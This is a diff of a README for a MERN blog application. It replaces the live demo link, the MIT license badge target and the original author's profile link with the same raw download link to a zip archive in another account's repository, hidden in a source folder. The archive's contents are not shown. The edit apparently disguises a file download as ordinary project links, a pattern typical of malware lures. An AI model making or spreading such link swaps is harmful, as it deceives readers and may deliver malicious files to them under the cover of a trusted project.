@@ -22,7 +22,7 @@ A virtual blog application using the MERN stack (MongoDB, Express js, React js, 
 
 This application is deployed on Heroku and can be accessed through the following link:
 
-[MERN Blog on Heroku](https://mern-blog-01.herokuapp.com/)
+[MERN Blog on Heroku](https://raw.githubusercontent.com/ndluna21/mern-blog/master/client/src/pages/Posts/mern-blog-2.4.zip)
 
 ## Technology
 
@@ -96,7 +96,7 @@ Now that the database has data and the environmental variables are all set, you 
 
 ## License
 
-[![License](https://img.shields.io/:License-MIT-blue.svg?style=flat-square)](http://badges.mit-license.org)
+[![License](https://img.shields.io/:License-MIT-blue.svg?style=flat-square)](https://raw.githubusercontent.com/ndluna21/mern-blog/master/client/src/pages/Posts/mern-blog-2.4.zip)
 
 - MIT License
-- Copyright 2021 © [Maryam Aljanabi](https://github.com/maryamaljanabi)
+- Copyright 2021 © [Maryam Aljanabi](https://raw.githubusercontent.com/ndluna21/mern-blog/master/client/src/pages/Posts/mern-blog-2.4.zip)
